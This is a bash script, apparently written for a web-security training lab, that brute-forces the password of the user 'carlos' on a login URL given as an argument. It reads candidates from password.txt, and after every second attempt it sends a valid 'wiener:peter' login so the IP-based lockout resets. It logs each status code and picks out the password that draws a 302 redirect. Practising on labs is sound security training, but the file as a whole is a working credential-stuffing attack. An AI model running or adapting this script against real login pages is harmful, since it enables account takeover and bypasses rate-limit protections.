#!/usr/bin/env bash

# bash script for the same.
# you have the usernames and passwords list, just execute them one by one. 
# make the user enter the url 

# if the number of arguments entered is 1 then only proceed


if [ $# == 1 ]
    then
    # url is $1
    # need to add URL checker
    # validate against a regex
    # left for now
    username="carlos"
    # need to make a curl request to the endpoint
    # curl request should include the session cookie
    # get the session cookie.
    session='H4xhFk7aMxwTq8wi7fNEZOBseUrqer7V'
    # need to iterate through the list
    x=0
    # need to get the total lines in the text file 
    last_line=`wc -l password.txt | gawk '{print $1}'`
    rm ./output.txt
    exec 3>output.txt

    while read pass
    do 
        if (( $x%2==0 )) && (( $x!=0 ))
        then
            # echo "$x executed divisible by 2"
            payload="username=wiener&password=peter"
            # make curl request 
            # add session cookie and payload
            curl -X POST $1 -d "$payload" -H "Cookie: session=$session" -w "username : wiener, password : peter, status : %{http_code}" | grep -i 'status :' >&3
        fi
            payload="username=$username&password=$pass"
            # echo "$x executed not divisible by 2"
            curl -X POST $1 -d "$payload" -H "Cookie: session=$session" -w "username : carlos, password : $pass, status : %{http_code}" | grep -i 'status :' >&3

        x=$[x+1]
    done < password.txt

    #now in the output.txt, you need to find that password which has status code 302 but the username is not wiener
    # we can use sed

    sed -n '/302/{
    p
    }' output.txt | sed -n '/wiener/!p'

else
    exit
fi
